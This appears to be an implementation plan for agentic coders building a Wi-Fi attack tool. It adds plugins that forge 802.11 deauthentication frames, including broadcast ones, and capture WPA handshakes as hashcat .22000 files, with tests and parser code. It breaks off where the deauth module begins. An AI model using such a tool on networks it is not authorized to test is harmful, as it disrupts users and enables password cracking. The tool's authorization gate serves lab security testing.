# cyberm4fia-wifi Phase 2a Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add `deauth` and `handshake` plugins to the existing scan TUI so the operator can capture a WPA 4-way handshake (raw `.pcap` + `.22000`) end-to-end from inside the TUI or via the CLI.

**Architecture:** Two new plugin modules under `src/cyberm4fia_wifi/plugins/` plus a thin glue layer in the existing sniffer/session/TUI. `HandshakePlugin` composes `DeauthPlugin` when auto-deauth is requested; both share the existing `EventBus` + `AuthorizationGate`. Final handshake validation is delegated to `hcxpcapngtool` (subprocess); a native M1-M4 state machine drives the TUI progress display.

**Tech Stack:** Python 3.11 · scapy 2.5 · Textual ≥ 0.50 · Click ≥ 8.1 · pytest · hcxpcapngtool (external, optional)

**Spec:** [`docs/superpowers/specs/2026-05-27-cyberm4fia-wifi-phase2a-design.md`](../specs/2026-05-27-cyberm4fia-wifi-phase2a-design.md)

---

## Pre-Flight

Confirm the repo is on the latest `master`, Phase 1 tests pass, and `hcxpcapngtool` is on `$PATH` (or note its absence for the hcxtools tests).

```bash
cd /home/erkanrzgc/cyberm4fia-wiFi-cracker
git status                                   # expect: clean
PYTHONPATH=src python3 -m pytest -q          # expect: 96 passed
command -v hcxpcapngtool || echo "hcxpcapngtool missing (some integration tests will skip)"
```

---

## Task 1: Evolve Event Contract (DeauthSent, HandshakeComplete, EAPOLCapture)

**Files:**
- Modify: `src/cyberm4fia_wifi/core/events.py`
- Test: `tests/unit/core/test_events.py`

- [ ] **Step 1: Write failing tests for the new event shapes**

Append to `tests/unit/core/test_events.py`:

```python
class TestPhase2EventDataclasses:
    def test_deauth_sent_carries_burst_position(self) -> None:
        from cyberm4fia_wifi.core.events import DeauthSent

        evt = DeauthSent(
            timestamp=1.0,
            target_bssid="aa:bb:cc:dd:ee:01",
            target_station="11:22:33:44:55:66",
            sequence=3,
            total=8,
        )
        assert evt.sequence == 3
        assert evt.total == 8

    def test_deauth_sent_allows_broadcast(self) -> None:
        from cyberm4fia_wifi.core.events import DeauthSent

        evt = DeauthSent(
            timestamp=1.0,
            target_bssid="aa:bb:cc:dd:ee:01",
            target_station=None,
            sequence=1,
            total=5,
        )
        assert evt.target_station is None

    def test_eapol_capture_carries_raw_bytes_and_optional_index(self) -> None:
        from cyberm4fia_wifi.core.events import EAPOLCapture

        evt = EAPOLCapture(
            timestamp=1.0,
            bssid="aa:bb:cc:dd:ee:01",
            station="11:22:33:44:55:66",
            message_index=2,
            raw=b"\x00\x01\x02",
        )
        assert evt.message_index == 2
        assert evt.raw == b"\x00\x01\x02"

    def test_eapol_capture_message_index_may_be_none(self) -> None:
        from cyberm4fia_wifi.core.events import EAPOLCapture

        evt = EAPOLCapture(
            timestamp=1.0,
            bssid="aa:bb:cc:dd:ee:01",
            station="11:22:33:44:55:66",
            message_index=None,
            raw=b"",
        )
        assert evt.message_index is None

    def test_handshake_complete_carries_artifact_paths(self) -> None:
        from cyberm4fia_wifi.core.events import HandshakeComplete

        evt = HandshakeComplete(
            timestamp=1.0,
            bssid="aa:bb:cc:dd:ee:01",
            station="11:22:33:44:55:66",
            pcap_path="/tmp/x.pcap",
            hashcat_path="/tmp/x.22000",
            valid_by_hcxtool=True,
        )
        assert evt.hashcat_path == "/tmp/x.22000"
        assert evt.valid_by_hcxtool is True
```

- [ ] **Step 2: Run test to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_events.py::TestPhase2EventDataclasses -v`
Expected: All five tests fail — `DeauthSent` / `HandshakeComplete` not importable; `EAPOLCapture.raw` / `message_index=None` not supported.

- [ ] **Step 3: Add new events and refine `EAPOLCapture`**

In `src/cyberm4fia_wifi/core/events.py`, replace the placeholder `EAPOLCapture` block and append the two new dataclasses:

```python
@dataclass(frozen=True, slots=True)
class EAPOLCapture(Event):
    """An EAPOL key frame seen on the wire. Emitted by the sniffer in Phase 2a.

    ``message_index`` is the 1..4 position of this frame in the WPA 4-way
    handshake; ``None`` when the EAPOL Key Info field is unparseable.
    ``raw`` is the full frame bytes so plugins can append it to a pcap.
    """

    bssid: str
    station: str
    message_index: int | None
    raw: bytes


@dataclass(frozen=True, slots=True)
class DeauthSent(Event):
    """One forged deauth frame just left the radio."""

    target_bssid: str
    target_station: str | None  # None == broadcast
    sequence: int               # 1-based position inside the burst
    total: int                  # configured burst size


@dataclass(frozen=True, slots=True)
class HandshakeComplete(Event):
    """A valid (per hcxpcapngtool) WPA handshake has been written to disk."""

    bssid: str
    station: str
    pcap_path: str
    hashcat_path: str | None    # None when hcxpcapngtool is missing/rejected
    valid_by_hcxtool: bool
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_events.py -q`
Expected: All event tests pass (previous 16 + 5 new).

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/core/events.py tests/unit/core/test_events.py
git commit -m "feat(core): add DeauthSent + HandshakeComplete; evolve EAPOLCapture

EAPOLCapture's Phase-1 placeholder field (pcap_offset:int) is replaced
with raw:bytes + Optional[int] message_index, matching what the sniffer
will actually emit. DeauthSent carries the burst position so the TUI
log can render '3/8' style progress. HandshakeComplete carries both
artifact paths and the hcxpcapngtool verdict."
```

---

## Task 2: EAPOL message-index parser (`utils/eapol.py`)

**Files:**
- Create: `src/cyberm4fia_wifi/utils/eapol.py`
- Create: `tests/unit/core/test_eapol_utils.py`

- [ ] **Step 1: Write failing tests**

Create `tests/unit/core/test_eapol_utils.py`:

```python
"""Tests for the EAPOL key-info → 4-way message index parser."""

from __future__ import annotations

import pytest

scapy = pytest.importorskip("scapy.all")
from scapy.all import EAPOL, Dot11, RadioTap  # noqa: E402

from cyberm4fia_wifi.utils.eapol import message_index  # noqa: E402

# Key Information field (16 bits) constants per IEEE 802.11-2016 §12.7.6
# bit layout (MSB → LSB):
#   reserved(2) | encrypted(1) | smk(1) | error(1) | request(1)
#   secure(1)   | mic(1) | ack(1) | install(1) | key_index(2) | key_type(1)
#   key_descriptor_version(3)
# Practical, well-known patterns:
M1_KEY_INFO = 0x008A  # version=2, type=pairwise, ack=1
M2_KEY_INFO = 0x010A  # version=2, type=pairwise, mic=1
M3_KEY_INFO = 0x13CA  # version=2, type=pairwise, install=1, ack=1, mic=1, secure=1
M4_KEY_INFO = 0x030A  # version=2, type=pairwise, mic=1, secure=1


def _make_key_frame(key_info: int) -> EAPOL:
    # EAPOL header (4 bytes) + Key descriptor (1 byte type) + key_info (2 bytes)
    # We only need enough payload that message_index can read offset 1..3.
    body = bytes([2])                          # Descriptor Type = RSN
    body += key_info.to_bytes(2, "big")        # Key Information
    body += b"\x00" * 89                       # Pad to a realistic key frame size
    return EAPOL(version=2, type=3, len=len(body)) / body


class TestMessageIndex:
    def test_m1_has_index_1(self) -> None:
        assert message_index(_make_key_frame(M1_KEY_INFO)) == 1

    def test_m2_has_index_2(self) -> None:
        assert message_index(_make_key_frame(M2_KEY_INFO)) == 2

    def test_m3_has_index_3(self) -> None:
        assert message_index(_make_key_frame(M3_KEY_INFO)) == 3

    def test_m4_has_index_4(self) -> None:
        assert message_index(_make_key_frame(M4_KEY_INFO)) == 4

    def test_non_eapol_returns_none(self) -> None:
        from scapy.all import Ether, IP

        pkt = Ether() / IP(dst="1.1.1.1")
        assert message_index(pkt) is None

    def test_eapol_without_key_payload_returns_none(self) -> None:
        pkt = EAPOL(version=2, type=0)  # type=0 is "EAPOL-Start", not a key frame
        assert message_index(pkt) is None
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_eapol_utils.py -v`
Expected: All six fail with `ModuleNotFoundError: No module named 'cyberm4fia_wifi.utils.eapol'`.

- [ ] **Step 3: Implement the parser**

Create `src/cyberm4fia_wifi/utils/eapol.py`:

```python
"""EAPOL key-frame parsing — return the 4-way handshake message index.

The WPA 4-way handshake is four EAPOL-Key frames. Their position (1, 2, 3, 4)
is encoded in the Key Information field of the key descriptor, per IEEE
802.11-2016 §12.7.6. We decode just enough bits to disambiguate:

  message 1 (AP → STA): ack=1, mic=0, install=0
  message 2 (STA → AP): ack=0, mic=1, install=0, secure=0
  message 3 (AP → STA): ack=1, mic=1, install=1
  message 4 (STA → AP): ack=0, mic=1, install=0, secure=1
"""

from __future__ import annotations

from typing import Any


def _scapy() -> Any:
    import scapy.all  # noqa: PLC0415 — lazy import

    return scapy.all


_ACK = 1 << 7
_MIC = 1 << 8
_INSTALL = 1 << 6
_SECURE = 1 << 9


def message_index(pkt: Any) -> int | None:
    """Return 1, 2, 3, or 4 for a WPA 4-way handshake key frame; None otherwise."""
    s = _scapy()
    EAPOL = s.EAPOL  # noqa: N806
    if not pkt.haslayer(EAPOL):
        return None

    eapol = pkt[EAPOL]
    if int(getattr(eapol, "type", -1)) != 3:
        # type 3 == EAPOL-Key; other types (Start/Logoff/etc) are not handshake.
        return None

    payload = bytes(eapol.payload)
    if len(payload) < 3:
        return None

    # payload[0] = descriptor type, payload[1:3] = Key Information (big-endian).
    key_info = int.from_bytes(payload[1:3], "big")
    ack = bool(key_info & _ACK)
    mic = bool(key_info & _MIC)
    install = bool(key_info & _INSTALL)
    secure = bool(key_info & _SECURE)

    if ack and not mic and not install:
        return 1
    if mic and not ack and not install and not secure:
        return 2
    if ack and mic and install:
        return 3
    if mic and not ack and not install and secure:
        return 4
    return None
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_eapol_utils.py -v`
Expected: All 6 pass.

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/utils/eapol.py tests/unit/core/test_eapol_utils.py
git commit -m "feat(utils): message_index parser for EAPOL key frames

Decodes the Key Information field (IEEE 802.11-2016 §12.7.6) and
returns 1/2/3/4 for the WPA 4-way handshake messages, or None for
anything outside the handshake. Tests build fixture EAPOL frames
with scapy and assert each message_index in isolation."
```

---

## Task 3: pcap append-mode writer (`utils/pcap_writer.py`)

**Files:**
- Create: `src/cyberm4fia_wifi/utils/pcap_writer.py`
- Create: `tests/unit/core/test_pcap_writer.py`

- [ ] **Step 1: Write failing tests**

Create `tests/unit/core/test_pcap_writer.py`:

```python
"""Tests for the append-mode pcap writer."""

from __future__ import annotations

from pathlib import Path

import pytest

scapy = pytest.importorskip("scapy.all")
from scapy.all import Ether, IP, rdpcap  # noqa: E402

from cyberm4fia_wifi.utils.pcap_writer import append_packets  # noqa: E402


def _pkt(payload: str) -> Ether:
    return Ether() / IP(dst="10.0.0.1") / payload.encode()


class TestAppendPackets:
    def test_writes_packets_when_file_absent(self, tmp_path: Path) -> None:
        out = tmp_path / "x.pcap"
        append_packets(out, [_pkt("a"), _pkt("b")])

        assert out.exists()
        read_back = rdpcap(str(out))
        assert len(read_back) == 2

    def test_appends_to_existing_file(self, tmp_path: Path) -> None:
        out = tmp_path / "x.pcap"
        append_packets(out, [_pkt("a")])
        append_packets(out, [_pkt("b"), _pkt("c")])

        read_back = rdpcap(str(out))
        assert len(read_back) == 3

    def test_empty_packet_list_is_noop(self, tmp_path: Path) -> None:
        out = tmp_path / "x.pcap"
        append_packets(out, [])
        assert not out.exists()

    def test_creates_parent_directory(self, tmp_path: Path) -> None:
        out = tmp_path / "nested" / "deep" / "x.pcap"
        append_packets(out, [_pkt("a")])
        assert out.exists()
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_pcap_writer.py -v`
Expected: All four fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement the writer**

Create `src/cyberm4fia_wifi/utils/pcap_writer.py`:

```python
"""Append-mode pcap writer.

scapy's ``PcapWriter`` supports ``append=True``, but it does not create the
parent directory and refuses an empty list. This wrapper does both, and forces
``sync=True`` so a crash mid-capture still leaves a valid pcap on disk.
"""

from __future__ import annotations

from collections.abc import Iterable
from pathlib import Path
from typing import Any


def _scapy() -> Any:
    import scapy.all  # noqa: PLC0415 — lazy import

    return scapy.all


def append_packets(path: Path, packets: Iterable[Any]) -> None:
    """Append ``packets`` to the pcap at ``path`` (creates if missing)."""
    pkt_list = list(packets)
    if not pkt_list:
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    s = _scapy()
    writer = s.PcapWriter(str(path), append=path.exists(), sync=True)
    try:
        for pkt in pkt_list:
            writer.write(pkt)
    finally:
        writer.close()
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_pcap_writer.py -v`
Expected: All four pass.

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/utils/pcap_writer.py tests/unit/core/test_pcap_writer.py
git commit -m "feat(utils): append-mode pcap writer with mkdir + fsync

Wraps scapy.PcapWriter so the parent directory is created lazily, an
empty packet list is a no-op (no zero-byte pcaps), and sync=True
forces each frame to disk — an interrupted capture still produces a
readable pcap for partial diagnosis."
```

---

## Task 4: hcxpcapngtool wrapper (`utils/hcxtools.py`)

**Files:**
- Create: `src/cyberm4fia_wifi/utils/hcxtools.py`
- Create: `tests/unit/core/test_hcxtools.py`

- [ ] **Step 1: Write failing tests**

Create `tests/unit/core/test_hcxtools.py`:

```python
"""Tests for the hcxpcapngtool subprocess wrapper."""

from __future__ import annotations

from pathlib import Path

import pytest

from cyberm4fia_wifi.utils import hcxtools


class _FakeRun:
    def __init__(self, returncode: int = 0, stdout: str = "", stderr: str = "") -> None:
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _fake_runner(plan: dict[str, _FakeRun]):
    calls: list[list[str]] = []

    def run(argv: list[str], **_kw) -> _FakeRun:
        calls.append(argv)
        return plan.get(argv[0], _FakeRun(returncode=127, stderr="not found"))

    return run, calls


class TestConvertTo22000:
    def test_returns_output_path_on_success(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        pcap = tmp_path / "h.pcap"
        pcap.write_bytes(b"x")  # presence check passes

        plan = {"hcxpcapngtool": _FakeRun(returncode=0)}
        run, calls = _fake_runner(plan)
        monkeypatch.setattr(hcxtools, "_run", run)
        monkeypatch.setattr(hcxtools, "_which", lambda _name: "/usr/bin/hcxpcapngtool")

        # Simulate that hcxpcapngtool actually wrote the output file.
        out_path = pcap.with_suffix(".22000")
        out_path.write_text("WPA*02*...")

        result = hcxtools.convert_to_22000(pcap)
        assert result == out_path
        assert calls[0][0] == "hcxpcapngtool"
        assert "-o" in calls[0]

    def test_returns_none_when_tool_missing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        pcap = tmp_path / "h.pcap"
        pcap.write_bytes(b"x")

        monkeypatch.setattr(hcxtools, "_which", lambda _name: None)
        assert hcxtools.convert_to_22000(pcap) is None

    def test_returns_none_when_tool_rejects_pcap(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        pcap = tmp_path / "h.pcap"
        pcap.write_bytes(b"x")

        plan = {"hcxpcapngtool": _FakeRun(returncode=1, stderr="no valid handshake")}
        run, _ = _fake_runner(plan)
        monkeypatch.setattr(hcxtools, "_run", run)
        monkeypatch.setattr(hcxtools, "_which", lambda _name: "/usr/bin/hcxpcapngtool")

        assert hcxtools.convert_to_22000(pcap) is None

    def test_returns_none_when_output_file_not_created(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        pcap = tmp_path / "h.pcap"
        pcap.write_bytes(b"x")

        plan = {"hcxpcapngtool": _FakeRun(returncode=0)}
        run, _ = _fake_runner(plan)
        monkeypatch.setattr(hcxtools, "_run", run)
        monkeypatch.setattr(hcxtools, "_which", lambda _name: "/usr/bin/hcxpcapngtool")
        # No file written on disk after the "success" run.

        assert hcxtools.convert_to_22000(pcap) is None
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_hcxtools.py -v`
Expected: All four fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement the wrapper**

Create `src/cyberm4fia_wifi/utils/hcxtools.py`:

```python
"""Thin wrapper around the external ``hcxpcapngtool`` binary.

``hcxpcapngtool`` is part of the hcxtools package (Kali: ``apt install
hcxtools``). It converts a libpcap-format handshake capture into the
``.22000`` text format that modern hashcat consumes. The tool is optional —
when missing, callers should keep the raw ``.pcap`` and warn the operator.

All subprocess calls go through the module-level ``_run`` and ``_which``
indirections so tests can patch a single attribute.
"""

from __future__ import annotations

import shutil
import subprocess
from pathlib import Path
from typing import Any


def _which(name: str) -> str | None:  # pragma: no cover — patched in tests
    return shutil.which(name)


def _run(argv: list[str], **_kw: Any) -> Any:  # pragma: no cover — patched in tests
    return subprocess.run(argv, check=False, capture_output=True, text=True)


def convert_to_22000(pcap: Path) -> Path | None:
    """Run ``hcxpcapngtool`` on ``pcap`` and return the .22000 output path.

    Returns ``None`` when the tool is not installed, returns a non-zero exit
    code, or for any reason fails to produce the output file.
    """
    if _which("hcxpcapngtool") is None:
        return None

    out = pcap.with_suffix(".22000")
    res = _run(["hcxpcapngtool", "-o", str(out), str(pcap)])
    if getattr(res, "returncode", 1) != 0:
        return None
    if not out.exists() or out.stat().st_size == 0:
        return None
    return out
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_hcxtools.py -v`
Expected: All four pass.

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/utils/hcxtools.py tests/unit/core/test_hcxtools.py
git commit -m "feat(utils): hcxpcapngtool subprocess wrapper

Converts a captured .pcap to hashcat's .22000 format when the tool is
on \$PATH. Returns None (rather than raising) when the tool is missing,
returns a non-zero exit code, or fails to produce a non-empty output —
callers (handshake plugin) keep the raw .pcap in that case and surface
a one-time warning. Subprocess + shutil.which calls are routed through
module-level indirections so unit tests never touch the real binary."
```

---

## Task 5: Sniffer EAPOL branch + MFP detection

**Files:**
- Modify: `src/cyberm4fia_wifi/core/sniffer.py`
- Modify: `src/cyberm4fia_wifi/core/events.py` (add `mfp_status` to `BeaconSeen`)
- Modify: `tests/unit/core/test_sniffer.py`

- [ ] **Step 1: Add `mfp_status` to `BeaconSeen`**

In `src/cyberm4fia_wifi/core/events.py`, extend `BeaconSeen`:

```python
@dataclass(frozen=True, slots=True)
class BeaconSeen(Event):
    bssid: str
    essid: str | None
    channel: int
    encryption: str
    signal_dbm: int
    wps: bool = False
    beacon_interval_ms: int = 0
    mfp_status: str = "unknown"   # "none" | "capable" | "required" | "unknown"
```

- [ ] **Step 2: Write failing sniffer tests**

Append to `tests/unit/core/test_sniffer.py`:

```python
class TestEapolDissection:
    def test_eapol_frame_emits_capture_event(self) -> None:
        from scapy.all import EAPOL, Dot11

        # Build: Dot11 (type=data) + LLC + SNAP + EAPOL key frame
        body = bytes([2]) + (0x008A).to_bytes(2, "big") + b"\x00" * 89
        eapol = EAPOL(version=2, type=3, len=len(body)) / body
        pkt = (
            Dot11(
                type=2, subtype=8,
                addr1="aa:bb:cc:dd:ee:01",
                addr2="11:22:33:44:55:66",
                addr3="aa:bb:cc:dd:ee:01",
            )
            / eapol
        )

        from cyberm4fia_wifi.core.events import EAPOLCapture
        from cyberm4fia_wifi.core.sniffer import dissect_packet

        evts = dissect_packet(pkt, now=100.0)
        eapol_evts = [e for e in evts if isinstance(e, EAPOLCapture)]
        assert len(eapol_evts) == 1
        evt = eapol_evts[0]
        assert evt.bssid == "aa:bb:cc:dd:ee:01"
        assert evt.station == "11:22:33:44:55:66"
        assert evt.message_index == 1
        assert isinstance(evt.raw, bytes) and len(evt.raw) > 0


class TestMfpDetection:
    def test_beacon_without_rsn_capabilities_is_unknown(self) -> None:
        # The existing _make_beacon helper builds a beacon without explicit
        # RSN capabilities → mfp_status stays "unknown".
        evts = dissect_packet(_make_beacon(rsn=True), now=100.0)
        b = evts[0]
        assert b.mfp_status in ("unknown", "none")  # accept either parse result
```

- [ ] **Step 3: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_sniffer.py::TestEapolDissection tests/unit/core/test_sniffer.py::TestMfpDetection -v`
Expected: EAPOL test fails (no branch yet); MFP test passes (default already "unknown").

- [ ] **Step 4: Implement the EAPOL branch + MFP parse**

In `src/cyberm4fia_wifi/core/sniffer.py`, in the `dissect_packet` function add a new branch *before* the existing data-frame handler:

```python
    EAPOL = getattr(s, "EAPOL", None)
    if EAPOL is not None and pkt.haslayer(EAPOL):
        from cyberm4fia_wifi.utils.eapol import message_index

        bssid = (dot11.addr3 or dot11.addr1 or "").lower()
        station = (dot11.addr2 or "").lower()
        if bssid and station:
            out.append(
                EAPOLCapture(
                    timestamp=ts,
                    bssid=bssid,
                    station=station,
                    message_index=message_index(pkt),
                    raw=bytes(pkt),
                )
            )
        return out
```

Then, in the beacon branch, extract MFP status from the RSN Capabilities and pass it to `BeaconSeen`. Add a helper near `_has_wps_ie`:

```python
def _mfp_status(pkt: Any) -> str:
    """Read the MFP bits from the RSN Capabilities field.

    Returns "required" / "capable" / "none" when an RSN IE is present,
    "unknown" otherwise.
    """
    try:
        Dot11EltRSN = getattr(_scapy(), "Dot11EltRSN", None)  # noqa: N806
    except AttributeError:
        return "unknown"
    if Dot11EltRSN is None:
        return "unknown"
    rsn = pkt.getlayer(Dot11EltRSN)
    if rsn is None:
        return "unknown"
    caps = int(getattr(rsn, "mfp_capable", 0)), int(getattr(rsn, "mfp_required", 0))
    capable, required = caps
    if required:
        return "required"
    if capable:
        return "capable"
    return "none"
```

Wire it into the beacon `BeaconSeen` construction (next to `wps=...`):

```python
                    mfp_status=_mfp_status(pkt),
```

Make sure `EAPOLCapture` is imported at the top of `sniffer.py`:

```python
from cyberm4fia_wifi.core.events import (
    BeaconSeen,
    ClientSeen,
    EAPOLCapture,
    Event,
    EventBus,
    ProbeSeen,
)
```

- [ ] **Step 5: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/ -q`
Expected: All 96 + 4 new pass.

- [ ] **Step 6: Commit**

```bash
git add src/cyberm4fia_wifi/core/events.py src/cyberm4fia_wifi/core/sniffer.py tests/unit/core/test_sniffer.py
git commit -m "feat(core): emit EAPOLCapture + detect MFP from RSN Capabilities

dissect_packet now has an EAPOL branch (before the generic data-frame
heuristic). For every EAPOL Key frame it publishes EAPOLCapture with
the parsed 4-way message index (1..4 or None) and the raw bytes so
plugins can append to a pcap.

Beacon dissection learns the MFP capable / required bits from the RSN
Capabilities field and attaches them to BeaconSeen.mfp_status, which
becomes the source of truth for the TUI's MFP warning."
```

---

## Task 6: Session — handshake count + MFP persistence + HandshakeComplete handler

**Files:**
- Modify: `src/cyberm4fia_wifi/core/session.py`
- Modify: `tests/unit/core/test_session.py`

- [ ] **Step 1: Write failing tests**

Append to `tests/unit/core/test_session.py`:

```python
class TestHandshakeAndMfpFields:
    def test_handshake_complete_event_bumps_counter(self) -> None:
        from cyberm4fia_wifi.core.events import HandshakeComplete

        sess = Session()
        sess.handle_event(_beacon())
        sess.handle_event(
            HandshakeComplete(
                timestamp=200.0,
                bssid="AA:BB:CC:DD:EE:01",
                station="11:22:33:44:55:66",
                pcap_path="/tmp/x.pcap",
                hashcat_path=None,
                valid_by_hcxtool=True,
            )
        )

        ap = sess.aps_snapshot()[0]
        assert ap.handshake_count == 1

    def test_mfp_status_promoted_from_beacon(self) -> None:
        from cyberm4fia_wifi.core.events import BeaconSeen

        sess = Session()
        sess.handle_event(
            BeaconSeen(
                timestamp=1.0,
                bssid="AA:BB:CC:DD:EE:01",
                essid="Home",
                channel=6,
                encryption="WPA2-PSK",
                signal_dbm=-50,
                mfp_status="required",
            )
        )
        assert sess.aps_snapshot()[0].mfp_status == "required"

    def test_mfp_status_unknown_does_not_overwrite_known(self) -> None:
        from cyberm4fia_wifi.core.events import BeaconSeen

        sess = Session()
        sess.handle_event(
            BeaconSeen(
                timestamp=1.0, bssid="x", essid="x", channel=1,
                encryption="WPA2-PSK", signal_dbm=-50, mfp_status="required",
            )
        )
        sess.handle_event(
            BeaconSeen(
                timestamp=2.0, bssid="x", essid="x", channel=1,
                encryption="WPA2-PSK", signal_dbm=-50, mfp_status="unknown",
            )
        )
        assert sess.aps_snapshot()[0].mfp_status == "required"
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_session.py::TestHandshakeAndMfpFields -v`
Expected: All three fail (`handshake_count`/`mfp_status` not on APRecord; HandshakeComplete not handled).

- [ ] **Step 3: Extend `APRecord` and `Session`**

In `src/cyberm4fia_wifi/core/session.py`:

Add fields to `APRecord`:

```python
    handshake_count: int = 0
    mfp_status: str = "unknown"
```

Extend `handle_event` to consume `HandshakeComplete`:

```python
from cyberm4fia_wifi.core.events import (
    BeaconSeen,
    ChannelChanged,
    ClientSeen,
    Event,
    EventBus,
    HandshakeComplete,
)
```

```python
    def handle_event(self, event: Event) -> None:
        if isinstance(event, BeaconSeen):
            self._upsert_ap(event)
        elif isinstance(event, ClientSeen):
            self._upsert_client(event)
        elif isinstance(event, ChannelChanged):
            with self._lock:
                self._active_channel = event.channel
        elif isinstance(event, HandshakeComplete):
            with self._lock:
                ap = self._aps.get(event.bssid.lower())
                if ap is not None:
                    ap.handshake_count += 1
```

Extend `attach` to subscribe to `HandshakeComplete`:

```python
    def attach(self, bus: EventBus) -> None:
        bus.subscribe(BeaconSeen, self.handle_event)
        bus.subscribe(ClientSeen, self.handle_event)
        bus.subscribe(ChannelChanged, self.handle_event)
        bus.subscribe(HandshakeComplete, self.handle_event)
```

In `_upsert_ap`, promote `mfp_status` (sticky like `wps`):

```python
                self._aps[evt.bssid] = APRecord(
                    ...
                    mfp_status=evt.mfp_status,
                )
                return
            ...
            if evt.mfp_status != "unknown":
                existing.mfp_status = evt.mfp_status
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_session.py -q`
Expected: All pass.

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/core/session.py tests/unit/core/test_session.py
git commit -m "feat(core): Session learns handshake_count + mfp_status

HandshakeComplete events bump the parent AP's handshake_count so the
TUI can show how many handshakes have been captured for each AP.
BeaconSeen.mfp_status promotes onto APRecord with the same stickiness
rule we use for wps — an 'unknown' beacon never overwrites a known
'required'/'capable'/'none' verdict."
```

---

## Task 7: `plugins/deauth.py` + CLI subcommand

**Files:**
- Create: `src/cyberm4fia_wifi/plugins/deauth.py`
- Modify: `src/cyberm4fia_wifi/plugins/__init__.py` (REGISTRY)
- Create: `tests/unit/core/test_deauth_plugin.py`

- [ ] **Step 1: Write failing tests**

Create `tests/unit/core/test_deauth_plugin.py`:

```python
"""Tests for the DeauthPlugin (frame construction + event emission)."""

from __future__ import annotations

import pytest

scapy = pytest.importorskip("scapy.all")

from cyberm4fia_wifi.core.auth import AuthorizationGate, AuthzConfig, Mode
from cyberm4fia_wifi.core.events import DeauthSent, EventBus
from cyberm4fia_wifi.plugins.deauth import DeauthPlugin


@pytest.fixture
def gate(tmp_config_home) -> AuthorizationGate:
    g = AuthorizationGate.from_xdg()
    g.set_config(AuthzConfig(mode=Mode.LAB, acknowledged_at="x"))
    return g


def _capture_sent(monkeypatch: pytest.MonkeyPatch) -> list:
    sent: list = []

    def fake_sendp(frames, **_kw):
        if isinstance(frames, list):
            sent.extend(frames)
        else:
            sent.append(frames)

    monkeypatch.setattr("scapy.all.sendp", fake_sendp)
    return sent


class TestDeauthExecute:
    def test_sends_configured_count(
        self, gate, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        sent = _capture_sent(monkeypatch)
        bus = EventBus()
        events: list = []
        bus.subscribe(DeauthSent, events.append)

        plugin = DeauthPlugin()
        rc = plugin.execute(
            bus=bus, gate=gate, iface="wlan0mon",
            target_bssid="AA:BB:CC:DD:EE:01",
            target_station="11:22:33:44:55:66",
            count=5, reason="test",
        )

        assert rc == 0
        assert len(sent) == 5
        assert [e.sequence for e in events] == [1, 2, 3, 4, 5]
        assert all(e.total == 5 for e in events)

    def test_broadcast_target_sets_station_none_and_uses_ff(
        self, gate, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        sent = _capture_sent(monkeypatch)
        bus = EventBus()
        events: list = []
        bus.subscribe(DeauthSent, events.append)

        plugin = DeauthPlugin()
        plugin.execute(
            bus=bus, gate=gate, iface="wlan0mon",
            target_bssid="AA:BB:CC:DD:EE:01",
            target_station=None,    # broadcast
            count=2, reason="test",
        )

        assert events[0].target_station is None
        # Dot11 addr1 (destination) should be broadcast on every frame.
        from scapy.all import Dot11
        for frame in sent:
            assert frame[Dot11].addr1.lower() == "ff:ff:ff:ff:ff:ff"

    def test_requires_reason_via_auth_gate(
        self, tmp_config_home, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from cyberm4fia_wifi.core.auth import AuthzError
        _capture_sent(monkeypatch)
        gate = AuthorizationGate.from_xdg()
        gate.set_config(AuthzConfig(mode=Mode.LAB, acknowledged_at="x"))
        plugin = DeauthPlugin()
        with pytest.raises(AuthzError):
            plugin.execute(
                bus=EventBus(), gate=gate, iface="wlan0mon",
                target_bssid="AA:BB:CC:DD:EE:01",
                target_station="11:22:33:44:55:66",
                count=1, reason="",   # empty → high-risk gate refuses
            )
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_deauth_plugin.py -v`
Expected: All three fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement the plugin**

Create `src/cyberm4fia_wifi/plugins/deauth.py`:

```python
"""Deauth plugin — risk=high.

Forges 802.11 deauthentication frames with the AP's BSSID spoofed in the
